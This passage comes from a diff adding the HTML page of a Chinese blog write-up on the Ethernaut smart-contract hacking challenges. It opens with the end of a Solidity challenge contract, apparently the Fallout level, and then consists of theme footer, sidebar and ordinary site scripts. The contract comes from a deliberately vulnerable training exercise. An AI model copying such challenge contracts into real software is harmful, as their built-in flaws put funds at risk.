require(allocations[allocator] &gt; 0);</span><br><span class="line">        allocator.transfer(allocations[allocator]);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function collectAllocations() public onlyOwner {</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function allocatorBalance(address allocator) public view returns (uint256) {</span><br><span class="line">        return allocations[allocator];</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+
+
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/covers/2.jpg" data-sizes="auto" alt="CryptoZombiesx的solidity学习" class="lazyload">
+        
+      
+      <a href="/2025/08/10/cryptozombiesx-de-solidity-xue-xi/"></a>
+      <div class="article-nav-caption">Older</div>
+      <h3 class="article-nav-title">
+        
+          CryptoZombiesx的solidity学习
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+
+
+
+
+</section>
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      
+      
+      
+        2024-2025
+      
+      <span class="footer-info-sep "></span>
+      mX1@0
+    </div>
+    
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        260.3k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        16:08
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#OpenZeppelin-%E7%9A%84%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%94%BB%E9%98%B2%E6%8C%91%E6%88%98%E9%A2%98%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">OpenZeppelin 的智能合约攻防挑战题解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%A5%E9%9D%B6%E5%9C%BA%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">该靶场运行原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%94%9F%E6%88%90%E6%96%B0%E5%AE%9E%E4%BE%8B%EF%BC%88Create-Instance%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">1. 生成新实例（Create Instance）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%93%8D%E4%BD%9C%E5%AE%9E%E4%BE%8B%EF%BC%88Exploit%EF%BC%89"><span class="toc-number">1.1.2.</span> <span class="toc-text">2. 操作实例（Exploit）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%8F%90%E4%BA%A4%E9%AA%8C%E8%AF%81%EF%BC%88Submit-Instance%EF%BC%89"><span class="toc-number">1.1.3.</span> <span class="toc-text">3. 提交验证（Submit Instance）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Hello-Ethernaut"><span class="toc-number">1.2.</span> <span class="toc-text">1 Hello Ethernaut</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Fallback"><span class="toc-number">1.3.</span> <span class="toc-text">2 Fallback</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Fallout"><span class="toc-number">1.4.</span> <span class="toc-text">3 Fallout</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="mX1@0" class="lazyload">
+  <div class="sidebar-author-name">mX1@0</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">64</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">18</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">24</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-twitter sidebar-social-icon">
+      <a href=https://x.com/0xMx1a0 itemprop="url" target="_blank" aria-label="twitter" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归类"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">归类</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+    
+  </div>
+  
+    
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  
+</nav>
+
+    </div>
+    
+    
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "mX1@0",
+          title: "OpenZeppelin 的智能合约攻防挑战题解",
+          url: "http://example.com/2025/08/12/openzeppelin-de-zhi-neng-he-yue-gong-fang-tiao-zhan-ti-jie/",
+          excerpt: "",
+          description: "",
+          stripContent: "OpenZeppelin 的智能合约攻防挑战题解该靶场运行原理在 Ethernaut（OpenZeppelin 的智能合约攻防挑战平台）中，玩家通过生成新实例、操作并提交实例来完成挑战。这种模式的原理涉及 智能合约工厂模式、状态验证与链上交互，以下是详细解析：  1. 生成新实例（Create Instance） 工厂合约部署  每个挑战都有一个工厂合约（如 Level01.sol），玩家调用其 createInstance() 函数时： 工厂会动态部署一个独立的挑战实例合约（如 Instanc",
+          date: "Tue Aug 12 2025 19:03:12 GMT+0800",
+          updated: "Tue Aug 12 2025 22:22:32 GMT+0800",
+          cover: "/images/%E7%8E%9B%E8%8E%8E%E6%8B%89%E8%92%82.jpg",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+        
+
+
+
+
+
+
+
+
+      
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.9.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+  </html>
+
